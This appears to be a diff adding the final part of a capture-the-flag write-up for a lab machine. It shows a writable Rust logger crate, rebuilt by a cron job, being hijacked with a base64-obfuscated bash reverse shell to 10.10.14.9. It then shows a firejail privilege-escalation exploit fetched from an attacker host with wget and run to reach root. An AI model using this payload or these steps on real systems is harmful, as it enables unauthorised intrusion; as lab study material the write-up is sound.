@@ -439,13 +439,107 @@ fn pull_indeces(conn: &mut mysql::PooledConn, directory: &str) {
 }
 ```
 
+I don't know rust well but from quick analysis it loads module called "logger".  
+We can look for this module with this command:  
+```
+find / -name logger* 2>/dev/null
+```
+![obraz](https://github.com/user-attachments/assets/274209b4-b960-4931-91d6-90bb82095d8c)
+
+it is located in:  
++  /opt/crates/logger
+
+Previously we found a cron running cargo run:  
++  /bin/sh -c cd /opt/tipnet && /bin/echo "e" | /bin/sudo -u atlas /usr/bin/cargo run --offline
+
+cargo run rebuild the binary everytime it is ran.  
+Let's check source code of logger module:  
+
+![obraz](https://github.com/user-attachments/assets/ba9a0ee8-c9a4-4729-ac05-b2fb91d896ad)
+
+Luckily we have write privilege over it:  
+
+![obraz](https://github.com/user-attachments/assets/98107a81-7c6e-4212-8fcd-3fe00c1a6f5f)
+
+We can simply add command at the bottom and one import at the top:  
+```rust
+extern crate chrono;
+
+use std::fs::OpenOptions;
+use std::io::Write;
+use chrono::prelude::*;
+use std::process::Command;
+
+pub fn log(user: &str, query: &str, justification: &str) {
+    let now = Local::now();
+    let timestamp = now.format("%Y-%m-%d %H:%M:%S").to_string();
+    let log_message = format!("[{}] - User: {}, Query: {}, Justification: {}\n", timestamp, user, query, justification);
+
+    let mut file = match OpenOptions::new().append(true).create(true).open("/opt/tipnet/access.log") {
+        Ok(file) => file,
+        Err(e) => {
+            println!("Error opening log file: {}", e);
+            return;
+        }
+    };
+
+    if let Err(e) = file.write_all(log_message.as_bytes()) {
+        println!("Error writing to log file: {}", e);
+    }
+
+Command::new("sh")
+        .arg("-c")
+        .arg("echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuOS85MDAwICAwPiYxCg== | base64 -d | bash")
+        .output()
+        .expect("failed");
+}
+```
+
+![obraz](https://github.com/user-attachments/assets/8137b1aa-d61e-4c1f-87de-b1e6fa1c8b52)
+
+After two minutes we get a shell as atlas:  
+
+![obraz](https://github.com/user-attachments/assets/188f77ad-89ce-4c95-a09c-aa1afe931bd8)
 
 
 
 
+## Priv Esc to root  
 
+There is an exploit for firejail:  
+```
+https://www.openwall.com/lists/oss-security/2022/06/08/10?source=post_page-----55cdb93e53c8---------------------------------------
+```
+They attached a script to the article:  
+```
+https://www.openwall.com/lists/oss-security/2022/06/08/10/1
+```
 
+It also depends if it's going to work on the firejail's version:  
 
+![obraz](https://github.com/user-attachments/assets/80fce6f5-07e0-4e8f-9110-8aad66762194)
+
+Now we can download exploit give it execute permission and run it:  
+```
+wget http://<attacker ip>/firejail.py
+chmopd +x firejail.py
+python3 firejail.py
+```
+
+![obraz](https://github.com/user-attachments/assets/9c7b3c2a-4e36-40bc-b934-9978601df45e)
+
+Now we need to re-run previous exploit with library hijacking to get the second terminal.  
+After that in the second terminal we can run:  
+```
+firejail --join=23193
+```
+and then change user with:  
+```
+su
+```
+![obraz](https://github.com/user-attachments/assets/f1a3aa5c-b891-4c65-b347-db9448a15435)
+
+Thanks for reading!!  
 
 
 
